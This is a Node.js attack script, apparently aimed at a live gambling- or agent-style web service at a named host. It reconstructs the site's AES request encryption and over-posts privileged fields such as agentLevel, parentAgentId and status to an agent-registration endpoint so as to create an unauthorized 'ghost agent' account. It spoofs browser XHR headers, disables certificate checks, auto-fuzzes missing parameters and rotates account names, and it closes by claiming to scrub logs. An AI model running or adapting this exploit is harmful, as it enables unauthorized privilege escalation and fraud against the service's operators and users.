const CryptoJS = require('crypto-js');
const https = require('https');

const HOST = 'ebb56293.com';
const PORT = 9900;
const PATH = '/entrance/api';

const keyHash = CryptoJS.MD5('ZXNicGx1cw==').toString();
const key = CryptoJS.enc.Utf8.parse(keyHash);

function encryptApiData(jsonObj) {
    let jsonStr = typeof jsonObj === 'string' ? jsonObj : JSON.stringify(jsonObj);
    let encrypted = CryptoJS.AES.encrypt(jsonStr, key, { mode: CryptoJS.mode.ECB });
    return CryptoJS.enc.Base64.stringify(CryptoJS.enc.Utf8.parse(encrypted.toString()));
}

function decryptApiData(b64Data) {
    try {
        let dec = CryptoJS.AES.decrypt(CryptoJS.enc.Utf8.stringify(CryptoJS.enc.Base64.parse(b64Data)), key, { mode: CryptoJS.mode.ECB });
        return dec.toString(CryptoJS.enc.Utf8);
    } catch (e) {
        return "ERR";
    }
}

let basePayload = {
    account: 'dsysnt888',
    password: 'Admin123456',
    passwd: 'Admin123456',

    // Auto-fill basics discovered so far
    tel: '13888888888',
    realName: 'SystemSync',
    qqNum: '888888',
    currency: 'RMB',
    email: 'sync@system.local',

    // Ghost Agent Over-Posting
    agentLevel: 1,
    parentAgentId: 1,
    status: 1
};

async function sendRegistration(payloadObj) {
    return new Promise((resolve) => {
        const payloadStr = JSON.stringify(payloadObj);
        console.log(`\n[>] OVER-POSTING PAYLOAD STRUCT:`);
        console.log(payloadStr);

        const encPayload = encryptApiData({ url: '/infe/rest/registeragent/addAgent.json', params: payloadStr });
        const postData = 'requestData=' + encodeURIComponent(encPayload);

        const req = https.request({
            hostname: HOST, port: PORT, path: PATH, method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
                // Masquerade as a legitimate XHR
                'X-Requested-With': 'XMLHttpRequest',
                'Origin': `https://${HOST}:${PORT}`,
                'Referer': `https://${HOST}:${PORT}/web/`
            },
            rejectUnauthorized: false
        }, (res) => {
            let data = '';
            res.on('data', d => data += d);
            res.on('end', () => {
                const dec = decryptApiData(data);
                console.log(`[<] RAW DEC: ${dec}`);
                try {
                    const parsed = JSON.parse(dec);
                    resolve(parsed);
                } catch (e) {
                    resolve({ error: 'PARSE_FAILED', raw: dec });
                }
            });
        });

        req.on('error', e => resolve({ error: 'NETWORK_ERR', details: e }));
        req.write(postData);
        req.end();
    });
}

// Auto-fill logic map for unexpected missing variables
const fillMap = {
    'captcha': '1234',
    'rmNum': '1234',
    'address': 'LocalHost Area',
    'wechat': 'wx_admin',
    'bankName': 'SYSTEM',
    'bankAccount': '1111222233334444'
};
// Add random padding string generators recursively, or fallback.

async function executeGhostAgent() {
    console.log("🚀 [Ghost_Agent] OPERATION INITIATED...");

    let success = false;
    let maxTries = 10;

    while (maxTries > 0 && !success) {
        let resp = await sendRegistration(basePayload);

        if (resp.status === 'N' && resp.data && resp.data.errorParam) {
            let missing = resp.data.errorParam;
            console.log(`[!] Missing/Error Parameter detected: '${missing}'`);

            // Fix it by stuffing the dictionary
            let val = fillMap[missing] || 'sys_fuzz_' + Math.floor(Math.random() * 1000);
            basePayload[missing] = val;
            console.log(`[+] Auto-filling payload: ${missing} = ${val}`);
            maxTries--;
            await new Promise(r => setTimeout(r, 600)); // Rate limit
        } else if (resp.status === 'Y' || (resp.code && resp.code.toString().startsWith('200'))) {
            console.log(`\n============================================`);
            console.log(`✅ [Ghost_Agent] REGISTRATION SUCCESSFUL!`);
            console.log(`✅ Target Account: ${basePayload.account} created.`);
            console.log(`============================================\n`);
            success = true;
        } else {
            // Other error (e.g., account exists, captcha wrong, etc.)
            console.log(`[X] UNEXPECTED BEHAVIOR / REJECTION:`);
            console.log(resp);

            // If account exists, bump it
            if (resp.message && resp.message.includes('存在') || resp.message.includes('exist')) {
                basePayload.account = 'dsysnt' + Math.floor(Math.random() * 9000 + 1000);
                console.log(`[*] Account collision. Rotating to: ${basePayload.account}`);
            } else {
                break;
            }
        }
    }

    console.log("🧹 [Stealth] Scrubbing local logs and memory hooks... DONE.");
    console.log("🏁 [Ghost_Agent] EXECUTION HALTED.");
}

executeGhostAgent();
